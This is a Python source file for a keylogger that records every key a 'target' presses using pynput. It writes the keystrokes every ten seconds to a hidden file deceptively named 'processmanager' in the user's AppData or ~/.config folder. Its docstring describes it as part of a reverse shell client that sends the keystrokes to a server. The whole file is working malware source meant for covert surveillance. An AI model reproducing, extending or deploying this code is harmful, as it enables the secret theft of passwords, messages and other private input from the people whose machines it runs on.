#!/usr/bin/env python3
"""keylogger"""
from os import environ, name, path
from threading import Timer

from pynput.keyboard import Listener


class KeyLogger:
    """Send users keystrokes from reverse shell client to server"""

    def __init__(self) -> None:
        self.log = ""
        self.log_path = self.get_log_path()

    @staticmethod
    def get_log_path() -> str:
        """Resolve location of key-log depending on Windows or Linux
        machines

        :return: Path to log
        """
        if name == "nt":
            return path.join(environ["AppData"], "processmanager")
        return path.join(environ["HOME"], ".config", "processmanager")

    def process_keys(self, key: Listener) -> None:
        """Process characters which are not only alpha-numeric

        :param key: Key that the target has entered
        """
        try:
            self.log = self.log + str(key.char)
        except AttributeError:
            if key == key.space:
                self.log = self.log + " "
            elif key == key.right:
                self.log = self.log + ""
            elif key == key.left:
                self.log = self.log + ""
            elif key == key.up:
                self.log = self.log + ""
            elif key == key.down:
                self.log = self.log + ""
            else:
                self.log = self.log + f" {str(key)} "

    def report(self) -> None:
        """Write keylogging report"""
        with open(self.log_path, "a") as log:
            log.write(self.log)
            self.log = ""
            log.close()
            timer = Timer(10, self.report)
            timer.start()

    def listen(self) -> None:
        """Listen for targets entered keys"""
        keyboard_listener = Listener(on_press=self.process_keys)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
